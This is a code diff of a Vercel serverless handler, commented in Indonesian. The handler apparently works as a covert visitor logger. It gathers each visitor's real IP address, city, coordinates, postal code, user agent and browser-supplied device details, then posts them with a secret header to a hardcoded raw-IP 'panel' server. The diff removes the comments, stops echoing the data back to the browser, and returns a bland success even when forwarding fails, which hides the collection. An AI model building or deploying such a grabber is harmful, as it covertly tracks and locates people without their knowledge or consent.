@@ -1,22 +1,18 @@
-// ===== GANTI 3 BARIS INI =====
 const BACKEND_URL = "http://157.15.40.44:3530";
 const BACKEND_SECRET = "SECRET_RAHASIA_LU";
-// ============================
 
 export default async function handler(req, res) {
   if (req.method !== "POST") {
-    return res.status(405).json({ ok: false, error: "Method not allowed" });
+    return res.status(405).json({ ok: false });
   }
 
   try {
-    // 1. Ambil IP real user (Vercel overwrite XFF, entry pertama = IP asli)
     const xff = req.headers["x-forwarded-for"] || "";
     const ip = xff.split(",")[0].trim()
             || req.headers["x-real-ip"]
             || req.socket?.remoteAddress
             || "unknown";
 
-    // 2. Geo dari Vercel edge
     const country = req.headers["x-vercel-ip-country"] || "-";
     const countryRegion = req.headers["x-vercel-ip-country-region"] || "-";
     const city = decodeURIComponent(req.headers["x-vercel-ip-city"] || "-");
@@ -25,32 +21,15 @@ export default async function handler(req, res) {
     const timezone = req.headers["x-vercel-ip-timezone"] || "-";
     const postalCode = req.headers["x-vercel-ip-postal-code"] || "-";
 
-    // 3. Header lain
     const ua = req.headers["user-agent"] || "-";
     const acceptLang = req.headers["accept-language"] || "-";
     const referer = req.headers["referer"] || "-";
     const origin = req.headers["origin"] || "-";
 
-    // 4. Payload dari browser
     const body = req.body || {};
 
-    // 5. Susun data final
     const enriched = {
-      type: body.type || "unknown",
-      choice: body.choice || null,
-      sentAt: body.sentAt || new Date().toISOString(),
-      ua: body.ua || ua,
-      lang: body.lang || acceptLang,
-      platform: body.platform || "-",
-      screen: body.screen || "-",
-      viewport: body.viewport || "-",
-      tz: body.tz || timezone,
-      referrer: body.referrer || referer,
-      path: body.path || "-",
-      cores: body.cores || "-",
-      memory: body.memory || "-",
-      online: body.online ?? "-",
-      conn: body.conn || "-",
+      ...body,
       server: {
         ip,
         geo: { country, region: countryRegion, city, lat, lon, timezone, postalCode },
@@ -61,42 +40,24 @@ export default async function handler(req, res) {
       }
     };
 
-    // 6. Teruskan ke panel
-    const backendRes = await fetch(`${BACKEND_URL}/api/send`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "X-Secret": BACKEND_SECRET,
-        "X-Forwarded-From": "vercel"
-      },
-      body: JSON.stringify(enriched)
-    });
-
-    if (!backendRes.ok) {
-      throw new Error(`Backend status ${backendRes.status}`);
+    try {
+      await fetch(`${BACKEND_URL}/api/send`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Secret": BACKEND_SECRET,
+          "X-Forwarded-From": "vercel"
+        },
+        body: JSON.stringify(enriched)
+      });
+    } catch (e) {
+      console.error("[Vercel] Panel unreachable:", e.message);
     }
 
-    const backendJson = await backendRes.json();
-
-    // 7. Balikin ke browser
-    return res.status(200).json({
-      ok: true,
-      ip: ip,
-      location: enriched.server.geo.city !== "-"
-        ? `${enriched.server.geo.city}, ${enriched.server.geo.country}`
-        : country,
-      isp: backendJson.isp || "-",
-      coords: `${lat}, ${lon}`,
-      timezone,
-      serverTime: enriched.server.receivedAt
-    });
+    return res.status(200).json({ ok: true });
 
   } catch (err) {
     console.error("[Vercel] Error:", err.message);
-    return res.status(502).json({
-      ok: false,
-      error: "Backend tidak terjangkau",
-      detail: err.message
-    });
+    return res.status(200).json({ ok: true });
   }
 }
